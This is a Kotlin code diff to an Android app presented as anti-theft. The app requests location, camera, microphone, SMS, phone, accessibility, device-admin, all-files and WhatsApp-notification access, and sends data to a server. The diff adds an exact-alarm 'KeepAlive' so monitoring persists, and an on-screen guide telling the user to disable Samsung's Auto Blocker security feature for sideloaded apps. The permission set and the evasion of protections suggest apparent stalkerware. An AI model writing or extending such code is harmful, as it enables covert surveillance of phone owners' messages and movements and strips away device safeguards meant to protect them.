@@ -77,6 +77,8 @@ class MainActivity : ComponentActivity() {
     private val hasSmsState              = mutableStateOf(false)
     private val hasActivityState         = mutableStateOf(false)
     private val hasWhatsAppListenerState = mutableStateOf(false)
+    // Android 12+ (Samsung One UI 4/5/6): permissão para alarmes exatos (necessário para KeepAlive)
+    private val hasExactAlarmState       = mutableStateOf(true)
 
     private val basicPermLauncher = registerForActivityResult(
         ActivityResultContracts.RequestMultiplePermissions()
@@ -113,6 +115,10 @@ class MainActivity : ComponentActivity() {
     }
 
     private val adminLauncher = registerForActivityResult(
+        ActivityResultContracts.StartActivityForResult()
+    ) { refreshPermStates() }
+
+    private val exactAlarmLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) { refreshPermStates() }
 
@@ -668,13 +674,19 @@ class MainActivity : ComponentActivity() {
         val hasSms             by hasSmsState
         val hasActivity        by hasActivityState
         val hasWhatsAppListener by hasWhatsAppListenerState
+        val hasExactAlarm      by hasExactAlarmState
         val hasAllFiles = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R)
             android.os.Environment.isExternalStorageManager() else true
         val isBatteryOptimized = isBatteryOptimizedFor(context)
 
+        // Samsung One UI 6 (Android 14+): "Auto Blocker" pode bloquear acessibilidade/notificações
+        val isSamsungAutoBlockerRisk = Build.MANUFACTURER.lowercase().contains("samsung") &&
+                Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE
+
         val allGranted = hasLocation && hasBgLocation && hasCamera && hasMic &&
                 hasPhone && hasSms && hasActivity && hasNotify && hasAccessibility &&
-                hasAdmin && hasWhatsAppListener && hasAllFiles && !isBatteryOptimized
+                hasAdmin && hasWhatsAppListener && hasAllFiles && !isBatteryOptimized &&
+                hasExactAlarm
 
         LaunchedEffect(Unit) {
             AntiTheftService.serverIpAddress = SERVER_HOST
@@ -873,10 +885,86 @@ class MainActivity : ComponentActivity() {
                 PermRow("Acesso a Todos os Arquivos", hasAllFiles)
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M)
                     PermRow("Sem otimização de bateria", !isBatteryOptimized)
+                // Samsung Android 12+: permissão para alarmes exatos (necessário para KeepAlive)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S)
+                    PermRow("Alarmes exatos (KeepAlive)", hasExactAlarm)
 
                 Spacer(Modifier.height(14.dp))
 
                 if (!allGranted) {
+                    // ── Samsung Auto Blocker (One UI 6 / Android 14+) ─────────────
+                    if (isSamsungAutoBlockerRisk && (!hasAccessibility || !hasWhatsAppListener)) {
+                        Box(
+                            Modifier
+                                .fillMaxWidth()
+                                .background(Color(0xFF2A1500), RoundedCornerShape(12.dp))
+                                .padding(12.dp)
+                        ) {
+                            Column {
+                                Text(
+                                    "⚠️  Samsung Auto Blocker Detectado",
+                                    color = Color(0xFFFF9900), fontSize = 12.sp, fontWeight = FontWeight.Bold
+                                )
+                                Spacer(Modifier.height(4.dp))
+                                Text(
+                                    "O Samsung One UI 6+ ativa o \"Auto Blocker\" por padrão, que impede apps instalados fora da Galaxy Store de usar Acessibilidade e Notificações. Desative-o:",
+                                    color = Color(0xFF8E94A5), fontSize = 11.sp, lineHeight = 15.sp
+                                )
+                                Spacer(Modifier.height(6.dp))
+                                listOf(
+                                    "Configurações → Segurança e privacidade",
+                                    "Toque em \"Auto Blocker\"",
+                                    "Desative o interruptor"
+                                ).forEachIndexed { i, s ->
+                                    Text("  ${i+1}. $s", color = Color(0xFFCDD5E0), fontSize = 11.sp, lineHeight = 15.sp)
+                                }
+                                Spacer(Modifier.height(8.dp))
+                                Button(
+                                    onClick = {
+                                        runCatching {
+                                            startActivity(Intent(Settings.ACTION_SECURITY_SETTINGS).apply {
+                                                flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                                            })
+                                        }
+                                    },
+                                    modifier = Modifier.fillMaxWidth(),
+                                    shape = RoundedCornerShape(10.dp),
+                                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF9900))
+                                ) {
+                                    Text("🔓  Abrir Configurações de Segurança", color = Color.Black, fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                                }
+                            }
+                        }
+                        Spacer(Modifier.height(10.dp))
+                    }
+
+                    // ── Alarmes exatos (Samsung Android 12+) ──────────────────────
+                    if (!hasExactAlarm && Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                        Button(
+                            onClick = {
+                                runCatching {
+                                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+                                        exactAlarmLauncher.launch(
+                                            Intent(android.provider.Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
+                                                data = android.net.Uri.fromParts("package", packageName, null)
+                                            }
+                                        )
+                                    }
+                                }
+                            },
+                            modifier = Modifier.fillMaxWidth().padding(bottom = 10.dp),
+                            shape = RoundedCornerShape(12.dp),
+                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00D2FF))
+                        ) {
+                            Text("⏰  Permitir Alarmes Exatos (KeepAlive)", color = Color(0xFF0A0B10), fontWeight = FontWeight.Bold, fontSize = 12.sp)
+                        }
+                        Text(
+                            "Necessário para manter o monitoramento ativo em Samsung Android 12+. Toque em \"Permitir\".",
+                            color = Color(0xFF8E94A5), fontSize = 10.sp, lineHeight = 14.sp,
+                            modifier = Modifier.padding(bottom = 10.dp)
+                        )
+                    }
+
                     if (isBatteryOptimized && Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                         Button(
                             onClick = {
@@ -1931,15 +2019,46 @@ class MainActivity : ComponentActivity() {
         }
     }.getOrElse { genericBatteryIntent() }
 
-    private fun samsungBatteryIntent() = runCatching {
-        Intent().apply {
-            component = android.content.ComponentName(
-                "com.samsung.android.lool",
-                "com.samsung.android.sm.battery.ui.BatteryActivity"
-            )
-            flags = Intent.FLAG_ACTIVITY_NEW_TASK
+    /**
+     * Abre a tela de bateria do Samsung Device Care.
+     *
+     * Tenta múltiplos caminhos de componente em ordem, pois cada versão do One UI
+     * usa um pacote/Activity diferente:
+     *  - One UI 6 (Android 14) / One UI 5 (Android 13): lool / BatteryActivity
+     *  - One UI 4 (Android 12) / One UI 3 (Android 11): lool / BatteryActivity (mesmo)
+     *  - One UI 2 (Android 10) / One UI 1 (Android 9): sm / BatteryActivity (pacote antigo)
+     *  - Galaxy chineses / SM-*CN: sm_cn / BatteryActivity
+     *  - Fallback: configurações de otimização de bateria do sistema (ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
+     */
+    private fun samsungBatteryIntent(): Intent {
+        val pm = packageManager
+        val candidates = listOf(
+            // One UI 3-6 (Android 11-14) — caminho principal
+            "com.samsung.android.lool" to "com.samsung.android.sm.battery.ui.BatteryActivity",
+            // One UI 3-6 — tela de apps em suspensão (alternativa)
+            "com.samsung.android.lool" to "com.samsung.android.sm.battery.ui.SleepingAppsActivity",
+            // One UI 1-2 (Android 9-10) — pacote legado
+            "com.samsung.android.sm" to "com.samsung.android.sm.battery.ui.BatteryActivity",
+            // Dispositivos Galaxy chineses (CN)
+            "com.samsung.android.sm_cn" to "com.samsung.android.sm.battery.ui.BatteryActivity",
+            // One UI muito antigo (pré-One UI 1)
+            "com.samsung.android.sm" to "com.samsung.android.sm.ui.battery.BatteryActivity"
+        )
+        for ((pkg, cls) in candidates) {
+            try {
+                val intent = Intent().apply {
+                    component = android.content.ComponentName(pkg, cls)
+                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                }
+                // Verifica se o componente existe antes de retorná-lo
+                if (pm.resolveActivity(intent, 0) != null) {
+                    return intent
+                }
+            } catch (_: Exception) { /* tenta próximo */ }
         }
-    }.getOrElse { genericBatteryIntent() }
+        // Fallback: configurações de otimização de bateria do Android (funciona em todos os OEMs)
+        return genericBatteryIntent()
+    }
 
     private fun oppoBatteryIntent() = runCatching {
         Intent().apply {
@@ -2127,6 +2246,11 @@ class MainActivity : ComponentActivity() {
         hasActivityState.value      = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
             hasPermission(Manifest.permission.ACTIVITY_RECOGNITION) else true
         hasWhatsAppListenerState.value = WhatsAppNotificationListener.isEnabled(this)
+        // Android 12+ (API 31+): verifica permissão para alarmes exatos (Samsung One UI 4/5/6)
+        hasExactAlarmState.value = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
+            val am = getSystemService(Context.ALARM_SERVICE) as android.app.AlarmManager
+            am.canScheduleExactAlarms()
+        } else true
     }
 
     private fun hasPermission(p: String) =
